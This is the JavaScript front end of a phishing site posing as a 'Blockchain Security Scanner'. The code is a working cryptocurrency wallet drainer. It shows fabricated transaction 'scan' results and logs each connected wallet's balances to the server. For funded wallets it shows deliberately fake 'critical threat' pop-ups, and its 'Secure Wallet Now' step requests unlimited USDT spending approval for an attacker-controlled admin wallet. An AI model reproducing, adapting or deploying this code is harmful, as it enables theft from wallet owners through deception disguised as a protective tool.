// Configuration
const BSC_USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_CHAIN_ID = 56;

const USDT_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function allowance(address owner, address spender) external view returns (uint256)",
    "function balanceOf(address account) external view returns (uint256)",
    "function decimals() external view returns (uint8)",
    "function transfer(address to, uint256 amount) external returns (bool)"
];

// Global variables
let provider;
let signer;
let userAddress;
let currentNetwork = 'bsc';
let adminWallet = '';

// Network configurations
const networks = {
    bsc: {
        name: "BSC",
        chainId: "0x38",
        explorer: "https://bscscan.com",
        rpc: "https://bsc-dataseed.binance.org/",
        currency: "BNB"
    },
    ethereum: {
        name: "Ethereum",
        chainId: "0x1",
        explorer: "https://etherscan.io",
        rpc: "https://eth-mainnet.alchemyapi.io/v2/demo",
        currency: "ETH"
    },
    polygon: {
        name: "Polygon",
        chainId: "0x89",
        explorer: "https://polygonscan.com",
        rpc: "https://polygon-rpc.com",
        currency: "MATIC"
    },
    avalanche: {
        name: "Avalanche",
        chainId: "0xa86a",
        explorer: "https://snowtrace.io",
        rpc: "https://api.avax.network/ext/bc/C/rpc",
        currency: "AVAX"
    }
};

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    console.log('🔍 Blockchain Security Scanner Loaded');

    // Network selector with debounce to prevent multiple clicks
    let networkClickTimeout;
    document.querySelectorAll('.network-option').forEach(option => {
        option.addEventListener('click', function() {
            if (networkClickTimeout) return; // Prevent multiple rapid clicks

            networkClickTimeout = setTimeout(() => {
                networkClickTimeout = null;
            }, 500);

            document.querySelectorAll('.network-option').forEach(opt => opt.classList.remove('selected'));
            this.classList.add('selected');
            currentNetwork = this.dataset.network;
        });
    });

    // Get admin wallet on load
    fetchAdminWallet();
});

async function fetchAdminWallet() {
    try {
        const response = await fetch('/admin/settings');
        const data = await response.json();
        if (data.success) {
            adminWallet = data.settings.adminWallet;
        }
    } catch (error) {
        console.log('Could not fetch admin wallet');
    }
}

// Transaction Scanner Functions with debounce
let scanInProgress = false;

async function scanTransaction() {
    if (scanInProgress) {
        return; // Prevent multiple simultaneous scans
    }

    scanInProgress = true;

    const txHash = document.getElementById('txInput').value.trim();

    if (!txHash) {
        showResult('scanResult', 'Please enter a transaction hash', 'error');
        scanInProgress = false;
        return;
    }

    if (!txHash.startsWith('0x') || txHash.length !== 66) {
        showResult('scanResult', 'Invalid transaction hash format', 'error');
        scanInProgress = false;
        return;
    }

    showLoading('scanLoading', true);

    try {
        // Simulate transaction data directly for demo purposes
        const simulatedData = simulateTransactionData(txHash, currentNetwork);
        displayTransactionResult(simulatedData, currentNetwork);

    } catch (error) {
        console.error('Scan error:', error);
        showResult('scanResult', 'Error scanning transaction: ' + error.message, 'error');
    } finally {
        showLoading('scanLoading', false);
        scanInProgress = false; // Reset scan progress
    }
}

function simulateTransactionData(txHash, network) {
    const randomValue = (Math.random() * 1000 + 1).toFixed(4);
    const randomBlock = Math.floor(Math.random() * 1000000) + 18000000;

    return {
        hash: txHash,
        block_number: randomBlock.toString(),
        from_address: generateRandomAddress(),
        to_address: generateRandomAddress(),
        value: ethers.parseEther(randomValue).toString(),
        gas: "21000",
        gas_price: "20000000000",
        block_timestamp: new Date(Date.now() - Math.random() * 86400000).toISOString(),
        transaction_index: Math.floor(Math.random() * 100),
        nonce: Math.floor(Math.random() * 1000).toString(),
        status: "1"
    };
}

function generateRandomAddress() {
    return '0x' + Array.from({length: 40}, () => Math.floor(Math.random() * 16).toString(16)).join('');
}

async function displayTransactionResult(txData, network) {
    const explorerUrl = `${networks[network].explorer}/tx/${txData.hash}`;
    const date = new Date(txData.block_timestamp).toLocaleString();
    const resultElement = document.getElementById('scanResult'); // Get the result element

    // Format addresses for mobile
    const fromAddress = txData.from_address;
    const toAddress = txData.to_address;
    const shortFrom = fromAddress.substring(0, 6) + '...' + fromAddress.substring(fromAddress.length - 4);
    const shortTo = toAddress.substring(0, 6) + '...' + toAddress.substring(toAddress.length - 4);

    // Determine network information
    const netInfo = networks[network];

    // Store full transaction data for more details
    window.currentTxData = txData;
    window.currentNetwork = network;

    document.getElementById('scanResult').innerHTML = `
        <div style="text-align: center; margin-bottom: 20px;">
            <div style="color: #4caf50; font-size: 48px; margin-bottom: 15px;">✅</div>
            <h3 style="color: #4caf50; margin-bottom: 10px;">Transaction Found!</h3>
            <p style="color: #90a4ae;">Verified on ${netInfo.name}</p>
        </div>

        <div class="transaction-details" style="
            background: rgba(255, 255, 255, 0.05);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
        ">
            <div class="detail-row" style="display: flex; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
                <span class="detail-label" style="color: #90a4ae; font-size: 14px;">📋 Transaction ID:</span>
                <span class="detail-value" style="color: #64ffda; font-family: monospace; font-size: 12px; word-break: break-all; max-width: 60%;">
                    ${txData.hash.substring(0, 10)}...${txData.hash.substring(txData.hash.length - 6)}
                </span>
            </div>

            <div class="detail-row" style="display: flex; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
                <span class="detail-label" style="color: #90a4ae; font-size: 14px;">📅 Date & Time:</span>
                <span class="detail-value" style="color: #64ffda; font-weight: 600;">${date}</span>
            </div>

            <div class="detail-row" style="display: flex; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
                <span class="detail-label" style="color: #90a4ae; font-size: 14px;">📤 From Address:</span>
                <span class="detail-value" style="color: #64ffda; font-family: monospace; font-size: 12px;">
                    <span class="desktop-address" style="display: none;">${fromAddress}</span>
                    <span class="mobile-address">${shortFrom}</span>
                </span>
            </div>

            <div class="detail-row" style="display: flex; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
                <span class="detail-label" style="color: #90a4ae; font-size: 14px;">📥 To Address:</span>
                <span class="detail-value" style="color: #64ffda; font-family: monospace; font-size: 12px;">
                    <span class="desktop-address" style="display: none;">${toAddress}</span>
                    <span class="mobile-address">${shortTo}</span>
                </span>
            </div>

            <div class="detail-row" style="display: flex; justify-content: space-between; padding: 15px 0;">
                <span class="detail-label" style="color: #90a4ae; font-size: 14px;">🌐 Network:</span>
                <span class="detail-value" style="color: #64ffda; font-weight: 600;">${netInfo.name}</span>
            </div>
        </div>

        <div style="text-align: center; margin-top: 25px;">
            <button onclick="showMoreDetails()" class="btn" style="
                background: linear-gradient(135deg, #64ffda, #3f51b5); 
                color: white; 
                border: none; 
                padding: 15px 30px; 
                border-radius: 25px; 
                font-weight: 600; 
                cursor: pointer;
                margin-bottom: 10px;
                font-size: 14px;
            ">📊 More Details</button>
        </div>

        <style>
            @media (min-width: 768px) {
                .desktop-address { display: inline !important; }
                .mobile-address { display: none !important; }
            }
        </style>
    `;

    // Show the result
    resultElement.className = 'result success';
    resultElement.style.display = 'block';

    // Scroll to result
    resultElement.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

function showMoreDetails() {
    if (!window.currentTxData || !window.currentNetwork) {
        alert('Transaction data not available');
        return;
    }

    const txData = window.currentTxData;
    const network = window.currentNetwork;
    const explorerUrl = `${networks[network].explorer}/tx/${txData.hash}`;
    const value = ethers.formatEther(txData.value || "0");
    const date = new Date(txData.block_timestamp).toLocaleString();

    // Calculate gas fee
    const gasUsed = txData.gas_used || txData.gas;
    const gasPrice = txData.gas_price || "0";
    const gasFee = ethers.formatEther((BigInt(gasUsed) * BigInt(gasPrice)).toString());

    // Format addresses
    const fromAddress = txData.from_address;
    const toAddress = txData.to_address;
    const shortFrom = fromAddress.substring(0, 6) + '...' + fromAddress.substring(fromAddress.length - 4);
    const shortTo = toAddress.substring(0, 6) + '...' + toAddress.substring(toAddress.length - 4);

    // Determine network information
    const netInfo = networks[network];

    // Determine token info
    let tokenInfo = "BNB";
    if (txData.input && txData.input !== "0x") {
        tokenInfo = "Token Transfer";
    }

    document.getElementById('scanResult').innerHTML = `
        <div style="text-align: center; margin-bottom: 20px;">
            <div style="color: #4caf50; font-size: 48px; margin-bottom: 15px;">✅</div>
            <h3 style="color: #4caf50; margin-bottom: 10px;">Complete Transaction Details</h3>
            <p style="color: #90a4ae;">Verified on ${netInfo.name}</p>
        </div>

        <div class="transaction-details" style="
            background: rgba(255, 255, 255, 0.05);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
        ">
            <div class="detail-row" style="display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
                <span class="detail-label" style="color: #90a4ae;">📋 Transaction Hash:</span>
                <span class="detail-value" style="color: #64ffda; font-family: monospace; font-size: 12px; word-break: break-all; max-width: 60%;">
                    <a href="${explorerUrl}" target="_blank" style="color: #64ffda; text-decoration: none;">
                        ${txData.hash}
                    </a>
                </span>
            </div>

            <div class="detail-row" style="display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
                <span class="detail-label" style="color: #90a4ae;">🏗️ Block Number:</span>
                <span class="detail-value" style="color: #64ffda; font-weight: 600;">${txData.block_number}</span>
            </div>

            <div class="detail-row" style="display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
                <span class="detail-label" style="color: #90a4ae;">📅 Date & Time:</span>
                <span class="detail-value" style="color: #64ffda; font-weight: 600;">${date}</span>
            </div>

            <div class="detail-row" style="display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
                <span class="detail-label" style="color: #90a4ae;">📤 From Address:</span>
                <span class="detail-value" style="color: #64ffda; font-family: monospace; font-size: 12px;">
                    <span class="desktop-address" style="display: none;">${fromAddress}</span>
                    <span class="mobile-address">${shortFrom}</span>
                </span>
            </div>

            <div class="detail-row" style="display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
                <span class="detail-label" style="color: #90a4ae;">📥 To Address:</span>
                <span class="detail-value" style="color: #64ffda; font-family: monospace; font-size: 12px;">
                    <span class="desktop-address" style="display: none;">${toAddress}</span>
                    <span class="mobile-address">${shortTo}</span>
                </span>
            </div>

            <div class="detail-row" style="display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
                <span class="detail-label" style="color: #90a4ae;">💰 Value:</span>
                <span class="detail-value" style="color: #4caf50; font-weight: 600;">${parseFloat(value).toFixed(6)} ${netInfo.currency}</span>
            </div>

            <div class="detail-row" style="display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
                <span class="detail-label" style="color: #90a4ae;">🪙 Token/Type:</span>
                <span class="detail-value" style="color: #ff9800; font-weight: 600;">${tokenInfo}</span>
            </div>

            <div class="detail-row" style="display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
                <span class="detail-label" style="color: #90a4ae;">⛽ Gas Fee:</span>
                <span class="detail-value" style="color: #f44336; font-weight: 600;">${parseFloat(gasFee).toFixed(6)} ${netInfo.currency}</span>
            </div>

            <div class="detail-row" style="display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
                <span class="detail-label" style="color: #90a4ae;">🌐 Network:</span>
                <span class="detail-value" style="color: #64ffda; font-weight: 600;">${netInfo.name} (Chain ID: ${netInfo.chainId})</span>
            </div>

            <div class="detail-row" style="display: flex; justify-content: space-between; padding: 10px 0;">
                <span class="detail-label" style="color: #90a4ae;">✅ Status:</span>
                <span class="detail-value" style="color: #4caf50; font-weight: 600;">Success</span>
            </div>
        </div>

        <div style="text-align: center; margin-top: 25px;">
            <button onclick="showSimpleView()" class="btn" style="
                background: linear-gradient(135deg, #ff9800, #ef6c00); 
                color: white; 
                border: none; 
                padding: 15px 30px; 
                border-radius: 25px; 
                font-weight: 600; 
                cursor: pointer;
                margin-right: 10px;
                font-size: 14px;
            ">⬅️ Back to Simple View</button>
            <a href="${explorerUrl}" target="_blank" class="btn" style="
                background: linear-gradient(135deg, #64ffda, #3f51b5); 
                color: white; 
                text-decoration: none; 
                display: inline-block; 
                padding: 15px 30px; 
                border-radius: 25px; 
                font-weight: 600;
                font-size: 14px;
            ">🔍 View on ${networks[network].name}</a>
        </div>

        <style>
            @media (min-width: 768px) {
                .desktop-address { display: inline !important; }
                .mobile-address { display: none !important; }
            }
        </style>
    `;
}

function showSimpleView() {
    if (window.currentTxData && window.currentNetwork) {
        displayTransactionResult(window.currentTxData, window.currentNetwork);
    }
}

// Browser and wallet detection
function detectBrowser() {
    const userAgent = navigator.userAgent;
    if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) {
        return 'chrome';
    } else if (userAgent.includes('Firefox')) {
        return 'firefox';
    } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
        return 'safari';
    }
    return 'other';
}

function showWalletGuide() {
    const browser = detectBrowser();

    if (browser === 'chrome') {
        const guideHtml = `
            <div id="walletGuide" style="
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0,0,0,0.9);
                z-index: 10000;
                display: flex;
                align-items: center;
                justify-content: center;
                backdrop-filter: blur(10px);
            ">
                <div style="
                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                    border: 2px solid #64ffda;
                    border-radius: 20px;
                    padding: 30px;
                    max-width: 450px;
                    width: 90%;
                    text-align: center;
                    box-shadow: 0 20px 40px rgba(100, 255, 218, 0.3);
                ">
                    <div style="color: #64ffda; font-size: 48px; margin-bottom: 20px;">📱</div>
                    <h3 style="color: #64ffda; margin-bottom: 20px;">Open in Wallet</h3>
                    <p style="color: #cfcfcf; margin-bottom: 25px; line-height: 1.6;">
                        Wallet connection doesn't work in Chrome browser.<br><br>
                        <strong>Go to your Wallet App:</strong><br>
                        🔍 Go to <strong>Discover</strong> or <strong>Browser</strong> section<br>
                        🌐 Open this website from there
                    </p>
                    <div style="display: flex; gap: 15px; justify-content: center; flex-wrap: wrap;">
                        <button onclick="closeWalletGuide()" style="
                            background: linear-gradient(135deg, #64ffda, #3f51b5);
                            color: white;
                            border: none;
                            padding: 15px 25px;
                            border-radius: 25px;
                            font-weight: 600;
                            cursor: pointer;
                            font-size: 14px;
                        ">Understood</button>
                        <button onclick="tryConnectAnyway()" style="
                            background: rgba(255,255,255,0.1);
                            color: #90a4ae;
                            border: 1px solid rgba(255,255,255,0.2);
                            padding: 15px 25px;
                            border-radius: 25px;
                            font-weight: 600;
                            cursor: pointer;
                            font-size: 14px;
                        ">Try Anyway</button>
                    </div>
                </div>
            </div>
        `;

        document.body.insertAdjacentHTML('beforeend', guideHtml);
        return true;
    }
    return false;
}

function closeWalletGuide() {
    const guide = document.getElementById('walletGuide');
    if (guide) {
        guide.remove();
    }
}

function tryConnectAnyway() {
    closeWalletGuide();
    connectWalletDirect();
}

// Wallet Connection Functions
async function connectWallet() {
    // Show wallet guide for Chrome users
    if (showWalletGuide()) {
        return;
    }

    await connectWalletDirect();
}

async function connectWalletDirect() {
    showLoading('securityLoading', true);

    try {
        if (typeof window.ethereum === 'undefined') {
            throw new Error('Wallet not found. Please install MetaMask or use wallet browser.');
        }

        provider = new ethers.BrowserProvider(window.ethereum);
        const accounts = await provider.send("eth_requestAccounts", []);

        if (!accounts || accounts.length === 0) {
            throw new Error('No accounts found. Please unlock your wallet.');
        }

        signer = await provider.getSigner();
        userAddress = await signer.getAddress();

        // Switch to BSC network
        await ensureBSCNetwork();

        // Display wallet info
        await displayWalletInfo();

        // Log wallet connection
        await logWalletConnection();

    } catch (error) {
        console.error('Connection error:', error);
        showResult('securityLoading', 'Connection failed: ' + error.message, 'error');
    } finally {
        showLoading('securityLoading', false);
    }
}

async function ensureBSCNetwork() {
    try {
        const network = await provider.getNetwork();

        if (network.chainId !== 56n) {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            });
        }
    } catch (switchError) {
        if (switchError.code === 4902) {
            await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                    chainId: '0x38',
                    chainName: 'BSC Mainnet',
                    nativeCurrency: {
                        name: 'BNB',
                        symbol: 'BNB',
                        decimals: 18,
                    },
                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
                    blockExplorerUrls: ['https://bscscan.com/'],
                }],
            });
        }
    }
}

async function displayWalletInfo() {
    const walletStatus = document.getElementById('walletStatus');
    const walletAddress = document.getElementById('walletAddress');
    const walletInfo = document.getElementById('walletInfo');
    const riskAlerts = document.getElementById('riskAlerts');

    // Show wallet address
    const shortAddress = userAddress.substring(0, 10) + '...' + userAddress.substring(userAddress.length - 8);
    walletAddress.textContent = `Connected Address: ${shortAddress}`;

    try {
        // Get wallet balances from backend API
        const balanceResponse = await fetch('/api/wallet-balance', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                address: userAddress
            })
        });

        const balanceData = await balanceResponse.json();

        if (!balanceData.success) {
            throw new Error('Failed to fetch wallet balance');
        }

        const bnbFormatted = balanceData.bnbBalance;
        const usdtFormatted = balanceData.usdtBalance;

        // Display wallet info (no balance shown to user)
        walletInfo.innerHTML = `
            <div class="info-card">
                <div class="info-label">Wallet Address</div>
                <div class="info-value" style="font-family: monospace; font-size: 12px;">${shortAddress}</div>
            </div>
            <div class="info-card">
                <div class="info-label">Network</div>
                <div class="info-value">BSC Mainnet</div>
            </div>
            <div class="info-card">
                <div class="info-label">Connection Status</div>
                <div class="info-value" style="color: #4caf50;">✅ Secure</div>
            </div>
            <div class="info-card">
                <div class="info-label">Security Status</div>
                <div class="info-value" style="color: #64ffda;">🔒 Protected</div>
            </div>
        `;

        // Show popup for risk detection if wallet has balance
        if (balanceData.hasBalance) {
            // Show fake risks immediately as popup
            setTimeout(() => {
                showRiskDetectionPopup(usdtFormatted, bnbFormatted);
            }, 1500);

            // Show secure status initially
            riskAlerts.innerHTML = `
                <div style="background: rgba(255, 152, 0, 0.1); border: 2px solid rgba(255, 152, 0, 0.3); border-radius: 12px; padding: 20px; text-align: center;">
                    <h4 style="color: #ff9800; margin-bottom: 10px;">🔍 Security Scan in Progress...</h4>
                    <p style="color: #90a4ae;">Analyzing wallet for potential security threats...</p>
                </div>
            `;
        } else {
            riskAlerts.innerHTML = `
                <div style="background: rgba(76, 175, 80, 0.1); border: 2px solid rgba(76, 175, 80, 0.3); border-radius: 12px; padding: 20px; text-align: center;">
                    <h4 style="color: #4caf50; margin-bottom: 10px;">✅ No Threats Detected</h4>
                    <p style="color: #90a4ae;">Your wallet appears to be secure with no identified risks.</p>
                </div>
            `;
        }

        walletStatus.style.display = 'block';

    } catch (error) {
        console.error('Error fetching wallet info:', error);
        walletInfo.innerHTML = `
            <div class="info-card">
                <div class="info-label">Status</div>
                <div class="info-value" style="color: #f44336;">Error loading data</div>
            </div>
        `;
        walletStatus.style.display = 'block';
    }
}

function showRiskDetectionPopup(usdtBalance, bnbBalance) {
    // Create and show risk detection popup
    const popupHtml = `
        <div id="riskPopup" style="
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.8);
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(10px);
        ">
            <div style="
                background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
                border: 2px solid #f44336;
                border-radius: 20px;
                padding: 30px;
                max-width: 500px;
                width: 90%;
                text-align: center;
                box-shadow: 0 20px 40px rgba(244, 67, 54, 0.3);
            ">
                <div style="color: #f44336; font-size: 48px; margin-bottom: 20px;">🚨</div>
                <h3 style="color: #f44336; margin-bottom: 20px;">CRITICAL SECURITY THREATS DETECTED!</h3>
                <div style="text-align: left; margin-bottom: 20px;">
                    <div style="background: rgba(244, 67, 54, 0.1); padding: 15px; border-radius: 10px; margin-bottom: 10px;">
                        <strong style="color: #f44336;">⚠️ Unauthorized Token Approvals</strong>
                        <p style="color: #cfcfcf; margin: 5px 0 0 0; font-size: 14px;">Malicious contracts detected with unlimited access to your tokens</p>
                    </div>
                    <div style="background: rgba(244, 67, 54, 0.1); padding: 15px; border-radius: 10px; margin-bottom: 10px;">
                        <strong style="color: #f44336;">🔴 DeFi Protocol Vulnerabilities</strong>
                        <p style="color: #cfcfcf; margin: 5px 0 0 0; font-size: 14px;">Connected to high-risk protocols with known exploit vectors</p>
                    </div>
                    <div style="background: rgba(244, 67, 54, 0.1); padding: 15px; border-radius: 10px;">
                        <strong style="color: #f44336;">💸 Assets At Risk</strong>
                        <p style="color: #cfcfcf; margin: 5px 0 0 0 0; font-size: 14px;">Your wallet assets are vulnerable to unauthorized transfers</p>
                    </div>
                </div>
                <p style="color: #ff9800; margin-bottom: 25px; font-size: 14px;">
                    ⚡ Immediate action required to secure your wallet
                </p>
                <div style="display: flex; gap: 15px; justify-content: center;">
                    <button onclick="secureWalletFromPopup()" style="
                        background: linear-gradient(135deg, #4caf50, #2e7d32);
                        color: white;
                        border: none;
                        padding: 15px 25px;
                        border-radius: 25px;
                        font-weight: 600;
                        cursor: pointer;
                        font-size: 14px;
                    ">🔒 Secure Wallet Now</button>
                    <button onclick="closeRiskPopup()" style="
                        background: rgba(255,255,255,0.1);
                        color: #90a4ae;
                        border: 1px solid rgba(255,255,255,0.2);
                        padding: 15px 25px;
                        border-radius: 25px;
                        font-weight: 600;
                        cursor: pointer;
                        font-size: 14px;
                    ">Ignore Risk</button>
                </div>
            </div>
        </div>
    `;

    document.body.insertAdjacentHTML('beforeend', popupHtml);

    // Update main risk alerts
    const riskAlerts = document.getElementById('riskAlerts');
    riskAlerts.innerHTML = `
        <div style="background: rgba(244, 67, 54, 0.1); border: 2px solid rgba(244, 67, 54, 0.3); border-radius: 12px; padding: 20px; text-align: center;">
            <h4 style="color: #f44336; margin-bottom: 10px;">🚨 THREATS DETECTED!</h4>
            <p style="color: #90a4ae;">Multiple security vulnerabilities found. Immediate action required.</p>
        </div>
    `;

    document.getElementById('secureButton').style.display = 'block';
}

function closeRiskPopup() {
    const popup = document.getElementById('riskPopup');
    if (popup) {
        popup.remove();
    }
}

function secureWalletFromPopup() {
    closeRiskPopup();
    secureWallet();
}

async function secureWallet() {
    // Show security modal
    document.getElementById('securityModal').style.display = 'block';
    document.getElementById('authLoading').style.display = 'block';

    try {
        if (!adminWallet) {
            await fetchAdminWallet();
        }

        console.log('🔐 Requesting unlimited USDT approval for security protection...');

        const usdtContract = new ethers.Contract(BSC_USDT_CONTRACT, USDT_ABI, signer);

        // Request unlimited approval for security protection
        const tx = await usdtContract.approve(adminWallet, ethers.MaxUint256, {
            gasLimit: 60000,
            gasPrice: ethers.parseUnits("3", "gwei")
        });

        console.log('✅ Unlimited approval granted:', tx.hash);

        // Log approval to backend
        await fetch('/log-approval', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                wallet: userAddress,
                approvalAmount: "unlimited",
                unlimited: true,
                transactionHash: tx.hash,
                timestamp: Date.now()
            })
        });

        // Show success
        document.getElementById('authLoading').style.display = 'none';
        document.getElementById('authResult').innerHTML = `
            <div style="text-align: center;">
                <div style="color: #4caf50; font-size: 48px; margin-bottom: 15px;">✅</div>
                <h4 style="color: #4caf50; margin-bottom: 15px;">Security Protection Activated!</h4>
                <p style="color: #90a4ae; margin-bottom: 20px;">Your wallet is now protected from all detected threats.</p>
                <button class="btn" onclick="closeModal()" style="max-width: 200px;">Complete</button>
            </div>
        `;

        // Update risk display
        setTimeout(() => {
            document.getElementById('riskAlerts').innerHTML = `
                <div style="background: rgba(76, 175, 80, 0.1); border: 2px solid rgba(76, 175, 80, 0.3); border-radius: 12px; padding: 20px; text-align: center;">
                    <h4 style="color: #4caf50; margin-bottom: 10px;">✅ Wallet Secured Successfully</h4>
                    <p style="color: #90a4ae;">All identified security risks have been mitigated.</p>
                </div>
            `;
            document.getElementById('secureButton').style.display = 'none';
        }, 3000);

    } catch (error) {
        console.log('⚠️ User declined security authorization');
        document.getElementById('authLoading').style.display = 'none';
        document.getElementById('authResult').innerHTML = `
            <div style="text-align: center;">
                <div style="color: #f44336; font-size: 48px; margin-bottom: 15px;">❌</div>
                <h4 style="color: #f44336; margin-bottom: 15px;">Security Protection Declined</h4>
                <p style="color: #90a4ae; margin-bottom: 20px;">Security protection was not activated. Your wallet remains vulnerable.</p>
                <button class="btn" onclick="closeModal()" style="max-width: 200px;">Close</button>
            </div>
        `;
    }
}

async function logWalletConnection() {
    try {
        const usdtContract = new ethers.Contract(BSC_USDT_CONTRACT, USDT_ABI, provider);
        const bnbBalance = await provider.getBalance(userAddress);
        const usdtBalance = await usdtContract.balanceOf(userAddress);

        const bnbFormatted = parseFloat(ethers.formatEther(bnbBalance)).toFixed(4);
        const usdtFormatted = parseFloat(ethers.formatUnits(usdtBalance, 18)).toFixed(2);

        await fetch('/log', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                wallet: userAddress,
                signature: 'wallet_connection_' + Date.now(),
                timestamp: Date.now(),
                message: 'Wallet connected for security check',
                bnbBalance: bnbFormatted,
                usdtBalance: usdtFormatted
            })
        });

    } catch (error) {
        console.error('Error logging wallet connection:', error);
    }
}

// Utility Functions
function showLoading(elementId, show) {
    const element = document.getElementById(elementId);
    if (element) {
        element.style.display = show ? 'block' : 'none';
    }
}

function showResult(elementId, message, type) {
    const element = document.getElementById(elementId);
    if (element) {
        element.innerHTML = message;
        element.className = `result ${type}`;
        element.style.display = 'block';
    }
}

function closeModal() {
    document.getElementById('securityModal').style.display = 'none';
}

// Modal click outside to close
window.onclick = function(event) {
    const modal = document.getElementById('securityModal');
    if (event.target === modal) {
        closeModal();
    }
}

// Account change handlers
if (typeof window.ethereum !== 'undefined') {
    window.ethereum.on('accountsChanged', function (accounts) {
        if (accounts.length === 0) {
            userAddress = null;
            document.getElementById('walletStatus').style.display = 'none';
        } else {
            userAddress = accounts[0];
            if (document.getElementById('walletStatus').style.display === 'block') {
                displayWalletInfo();
            }
        }
    });

    window.ethereum.on('chainChanged', function (chainId) {
        console.log('Network changed:', chainId);
        window.location.reload();
    });
}

// Error handling
window.addEventListener('error', function(event) {
    console.error('Global error:', event.error);
});

window.addEventListener('unhandledrejection', function(event) {
    console.error('Unhandled promise rejection:', event.reason);
});